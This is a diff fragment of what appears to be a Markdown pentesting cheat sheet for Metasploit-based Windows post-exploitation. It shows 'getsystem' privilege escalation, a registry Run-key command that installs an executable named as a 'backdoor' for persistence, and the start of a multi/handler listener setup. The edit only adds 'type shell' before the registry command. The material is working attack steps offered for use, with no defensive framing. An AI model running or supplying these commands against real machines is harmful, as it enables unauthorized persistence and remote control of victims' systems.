@@ -895,7 +895,8 @@ getsystem -t 1 (escalate previlage)
 ```
 >to ingect malicious file
 ```console
-~$:reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
+~$:type shell
+reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_EXPAND_SZ /d "C:\Users\Admin\Downloads\registry.exe"
 
 msfconsole in another cmd
  use exploit/multi/handler
